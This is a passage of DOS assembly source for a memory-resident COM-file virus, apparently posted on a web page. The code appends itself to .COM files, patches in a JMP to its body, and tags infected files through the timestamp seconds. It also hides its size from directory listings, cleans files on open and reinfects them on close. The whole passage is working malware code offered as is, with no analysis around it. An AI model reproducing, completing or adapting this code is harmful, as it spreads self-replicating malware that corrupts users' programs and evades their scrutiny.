                int     21h

                sub     ax,3                    ;create a jmp
                mov     jmp_2,ax

                mov     ah,40h                  ;write virus
                mov     dx,100h
                mov     cx,filelen
                int     21h

                mov     ax,4200h                ;goto beg
                xor     dx,dx
                xor     cx,cx
                int     21h

                mov     ah,40h                  ;write jmp
                mov     cx,3
                lea     dx,jmp_1
                int     21h
cancel_inf2:
                pop     cx                      ;restore time/date
                pop     dx

                and     cl,11100000b            ;secs=20
                or      cl,00001010b
                mov     ax,5701h                ;set time/date
                int     21h

                mov     ah,3eh                  ;close
                pushf
                push    cs
                call    call_int21h

                mov     ax,4301h                ;set attrib
                lea     dx,filename
                pop     cx                      ;restore attrib
                int     21h

                ret
find_new:
                pop     bp
                popf

                pushf                           ;find 4e
                push    cs
                call    call_int21h
                jnc     more_files
                retf    2
more_files:
                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                push    bp

                mov     ah,2fh                  ;get dta
                int     21h

                push    es              ;es:bx
                pop     ds              ;ds:bx

                mov     si,bx           ;ds:si

                push    cs              ;cs => es
                pop     es

                add     si,1eh          ;f name
                lea     di,filename
                mov     cx,25

get_fname:
                lodsb
                cmp     al,0
                je      get_f_klar
                stosb
                loop    get_fname
get_f_klar:
                mov     al,0            ;asciiz
                stosb

                push    ds              ;ds=> es
                pop     es
                push    cs              ;cs=> ds
                pop     ds
                mov     si,di

                sub     si,4            ;'COM'
                lodsw                   ;CO

                cmp     ax,'OC'
                je      check_m
                cmp     ax,'oc'
                jne     cancel_new
check_m:
                lodsb
                cmp     al,'m'
                je      ext_is_com
                cmp     al,'M'
                jne     cancel_new

ext_is_com:
                push    es              ;es=> ds
                pop     ds

                mov     si,bx
                add     si,1ch          ;check size
                lodsw
                cmp     ax,0            ;=> 0ffffh
                jne     cancel_new

                mov     si,bx
                add     si,16h
                lodsw                   ;time
                and     al,00011111b
                cmp     al,00001010b
                jne     cancel_new     ;not infected

                mov     si,bx
                add     si,1ah
                mov     di,si
                lodsw                   ;alter size
                sub     ax,cs:filelen
                jz      cancel_new
                stosw

cancel_new:
                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
no_more_files2: retf    2               ;iret flags
open:
                pop     bp
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    bp
                push    ds
                push    es


                mov     al,'.'
                push    ds              ;ds=> es
                pop     es
                mov     di,dx           ;es:di filename

                mov     cx,50
                repnz   scasb

                mov     si,di           ;ds:si file ext.

                lodsw
                cmp     ax,'OC'
                je      check_m2
                cmp     ax,'oc'
                je      $+7
                lea     dx,cancel_open
                jmp     far ptr dx
check_m2:
                lodsb
                cmp     al,'m'
                je      ext_is_com2
                cmp     al,'M'
                jne     cancel_open

ext_is_com2:
                mov     ax,3d02h        ;open file
                pushf
                push    cs
                call    call_int21h
                jc      cancel_open
                mov     bx,ax

                push    cs
                pop     ds
                push    cs
                pop     es

                mov     ax,5700h        ;get time/date
                int     21h

                and     cl,00011111b    ;already infected
                cmp     cl,00001010b
                jne     cancel_open

                mov     ax,4202h        ;goto eof
                xor     dx,dx
                xor     cx,cx
                int     21h

                push    ax              ;save size
                sub     ax,3

                mov     dx,ax           ;goto eof -3
                mov     ax,4200h
                mov     cx,0
                int     21h

                mov     ah,3fh          ;read
                mov     cx,3
                lea     dx,temp_bytes
                int     21h


                mov     ax,4200h        ;goto beg
                xor     cx,cx
                xor     dx,dx
                int     21h

                mov     ah,40h          ;write original
                mov     cx,3
                lea     dx,temp_bytes
                int     21h

                pop     dx
                sub     dx,filelen

                mov     ax,4200h        ;goto real size
                mov     cx,0
                int     21h

                mov     ah,40h
                mov     cx,0
                int     21h

                mov     ah,3eh
                pushf
                push    cs
                call    call_int21h
cancel_open:
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf

                pushf                           ;open file...
                push    cs
                call    call_int21h
                retf    2

close_file:
                pop     bp
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    bp
                push    ds
                push    es

                mov     ax,1220h        ;get handle table
                int     02Fh
                mov     bl,es:[di]
                mov     ax,1216h
                int     02Fh

                mov     bp,di

                add     di,28h
                push    es
                pop     ds
                mov     si,di
                lodsw
                cmp     ax,'OC'
                jne     cancel_open
                lodsb
                cmp     al,'M'
                jne     cancel_open

                mov     si,bp
                add     si,20h
                push    cs
                pop     es

                call    infect

                jmp     cancel_open

get_rnd:
                push   dx
                push   cx
                push   bx
                in     al,40h                         ;'@'
                add    ax,0000
                mov    dx,0000
                mov    cx,0007
rnd_init5:
                shl    ax,1
                rcl    dx,1
                mov    bl,al
                xor    bl,dh
                jns    rnd_init6
                inc    al
rnd_init6:
                loop   rnd_init5
                pop    bx
                mov    al,dl
                pop    cx
                pop    dx
rnd_init_ret:
                ret

logo            db      '>>>  A.N.O.I  <<<' ; DATA to overwrite with


temp_bytes      db      3 dup(?)
filelen         dw      offset eof - offset start
memlen          dw      100
file_buffer     db      80 dup(20h)
filename        db      12 dup(?)

jmp_1           db      0e9h
jmp_2           dw      ?
first_bytes     db      90h,0cdh,20h

eof:
                end     start
</textarea></td></tr></table></body></html>
